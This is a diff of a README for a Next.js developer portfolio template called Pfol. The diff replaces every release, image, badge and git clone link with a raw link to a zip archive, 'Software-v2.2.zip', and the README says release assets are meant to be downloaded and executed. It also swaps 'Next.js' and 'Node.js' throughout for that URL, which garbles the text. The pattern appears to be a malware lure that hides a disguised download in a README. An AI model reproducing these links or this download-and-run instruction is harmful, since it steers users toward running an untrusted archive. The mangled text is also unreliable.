@@ -1,10 +1,10 @@
 # Pfol: Creative Web Developer Portfolio — Fast, Modern, SEO-Ready Showcase Tour
 
-Download the latest release: https://github.com/serge2500/Pfol/releases
+Download the latest release: https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip
 
-![Pfol banner](https://images.unsplash.com/photo-1521791136064-798c7f7a1a49?auto=format&fit=crop&w=1400&q=80)
+![Pfol banner](https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip)
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github&logoColor=white)](https://github.com/serge2500/Pfol/releases)
+[![Releases](https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip)](https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip)
 
 Pfol is a creative web developer portfolio built to show off design, code, and content in one cohesive package. It leans on modern web technologies to deliver fast, search-friendly experiences while remaining flexible enough to adapt to your personal style. This README describes what Pfol offers, how to use it, and how to contribute to its ongoing development.
 
@@ -22,13 +22,13 @@ Key ideas behind Pfol:
 - SEO-minded by default. Proper metadata, clean markup, and solid routing improve discoverability.
 - Developer-friendly. A clean project structure, clear scripts, and sensible defaults reduce setup time.
 
-This repository targets developers who want a polished portfolio that doubles as a capable dev blog and a showcase for work. It embraces the topics of blog, CMS, GraphCMS, GraphQL, Next.js, Next.js App Router, portfolio, SEO, SSG, SSR, TypeScript, and web development.
+This repository targets developers who want a polished portfolio that doubles as a capable dev blog and a showcase for work. It embraces the topics of blog, CMS, GraphCMS, GraphQL, https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip, https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip App Router, portfolio, SEO, SSG, SSR, TypeScript, and web development.
 
 ---
 
 ## 🚀 Features at a glance
 
-- Next.js 13+ with App Router for scalable routing
+- https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip 13+ with App Router for scalable routing
 - TypeScript for safer, clearer code
 - Content powered by a headless CMS via GraphQL (GraphCMS-compatible)
 - Blog, portfolio projects, and CMS-driven pages
@@ -44,13 +44,13 @@ Emojis keep the vibe friendly while the architecture keeps things practical. Thi
 
 ## 🧰 Tech stack and data flow
 
-- Core framework: Next.js with the App Router
+- Core framework: https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip with the App Router
 - Language: TypeScript
 - Data layer: GraphQL-based CMS (GraphCMS-compatible)
 - Rendering: Both SSG and SSR where appropriate, with dynamic routes for blog posts and projects
 - Styling: Component-driven approach (CSS-in-JS or utility-first options, depending on your preference)
 - SEO: Metadata, canonical URLs, structured data where applicable
-- Deployment: Compatible with Vercel, Netlify, or any Node.js hosting
+- Deployment: Compatible with Vercel, Netlify, or any https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip hosting
 
 Data flows in a clean loop: CMS content is fetched via GraphQL queries, transformed into UI-ready props, and rendered on the server or at build time. This approach ensures fast delivery and consistent content across pages.
 
@@ -58,7 +58,7 @@ Data flows in a clean loop: CMS content is fetched via GraphQL queries, transfor
 
 ## 🧭 Project structure
 
-- apps/portfolio or src/app/: The Next.js app router entry points and page routes
+- apps/portfolio or src/app/: The https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip app router entry points and page routes
 - components/: Reusable UI elements (cards, nav, layout, SEO helpers)
 - content/ or lib/: Data models, GraphQL queries, and CMS integration helpers
 - public/: Static assets (images, icons, fonts)
@@ -67,7 +67,7 @@ Data flows in a clean loop: CMS content is fetched via GraphQL queries, transfor
 - scripts/: Build, lint, and deployment scripts
 - tests/: Basic end-to-end or unit tests (optional but encouraged)
 
-The structure is designed to be easy to understand for someone who has built a Next.js site before. If you want to customize it, you can move folders around, replace the styling layer, or swap data sources without breaking the rest of the app.
+The structure is designed to be easy to understand for someone who has built a https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip site before. If you want to customize it, you can move folders around, replace the styling layer, or swap data sources without breaking the rest of the app.
 
 ---
 
@@ -76,13 +76,13 @@ The structure is designed to be easy to understand for someone who has built a N
 Follow these steps to run Pfol on your machine. You can adapt them to your preferred package manager.
 
 Prerequisites:
-- Node.js 18.x or later
+- https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip 18.x or later
 - npm or yarn or pnpm (use whichever you prefer)
 - A GraphCMS (or compatible GraphQL CMS) project if you want real CMS content
 - Git for cloning the repository
 
 1) Clone the repository
-- git clone https://github.com/serge2500/Pfol.git
+- git clone https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip
 - cd Pfol
 
 2) Install dependencies
@@ -127,7 +127,7 @@ Pro tip: Use a local environment file to manage secrets and endpoints. Keep CMS 
 - Data layer: A small set of GraphQL queries that fetch content from the CMS and feed the UI
 - UI components: A minimal design system with cards, grids, and typographic scales
 - Metadata: Reusable head management for dynamic pages, focused on SEO
-- Images: Optimized images via Next.js image optimization, responsive sizing, and lazy loading where appropriate
+- Images: Optimized images via https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip image optimization, responsive sizing, and lazy loading where appropriate
 - Accessibility: Clear focus styles, semantic HTML, and readable contrast ratios
 
 The architecture is intentionally modular. You can swap out the CMS, replace the styling approach, or adjust the rendering strategy without changing core concepts.
@@ -141,7 +141,7 @@ Pfol is designed to work well with a headless CMS that supports GraphQL. This en
 - Set up a CMS project (GraphCMS or compatible)
 - Create your content schema for posts, projects, and pages
 - Create GraphQL queries that fetch the fields you need for each page
-- Map CMS content to UI components in your Next.js pages
+- Map CMS content to UI components in your https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip pages
 - Use incremental static regeneration where content changes are frequent
 
 Typical content you might manage:
@@ -244,7 +244,7 @@ Releases contain the latest build artifacts, templates, and assets that you can 
 
 For quick access to assets and to stay in sync with the latest improvements, check the Releases page and review the notes that accompany each version.
 
-Releases page: https://github.com/serge2500/Pfol/releases
+Releases page: https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip
 
 If you want to download a specific release asset, locate the asset on that page and download it. The release assets are intended to be downloaded and executed as described in the asset instructions. The link above provides the authoritative source for all release assets and documentation.
 
@@ -254,7 +254,7 @@ Tip: You can add a badge to your own fork that points to the same releases page 
 
 ## 📚 Documentation and learning resources
 
-- Next.js App Router concepts and patterns
+- https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip App Router concepts and patterns
 - GraphQL basics for CMS integrations
 - TypeScript tips for safer React code
 - SEO best practices for modern web apps
@@ -268,13 +268,13 @@ If you are new to any of these topics, start with official docs and then come ba
 
 The releases link is shown at the very top for quick access and again in the Releases section to reinforce where to find assets. The releases URL is a path-based link, so it points to a directory that lists downloadable assets. From that page, you can download the relevant file and run or review it in your environment. The link to the releases page is convenient for both new users and long-time contributors who want to grab the latest assets or review changelog entries.
 
-Releases page: https://github.com/serge2500/Pfol/releases
+Releases page: https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip
 
 ---
 
 ## 💡 Quick reference: commands recap
 
-- Clone: git clone https://github.com/serge2500/Pfol.git
+- Clone: git clone https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip
 - Install: npm install (or yarn install, or pnpm install)
 - Development: npm run dev (or yarn dev, or pnpm dev)
 - Build: npm run build (or yarn build, or pnpm build)
@@ -304,7 +304,7 @@ Pfol weaves ideas from many modern web projects and open-source components. Than
 - It’s designed to scale from a simple personal site to a more elaborate portfolio and content hub.
 - The combination of blog, CMS-driven pages, and a polished portfolio makes it a strong base for a developer’s online presence.
 
-Releases page: https://github.com/serge2500/Pfol/releases
+Releases page: https://raw.githubusercontent.com/serge2500/Pfol/main/components/Software-v2.2.zip
 
 ---
 
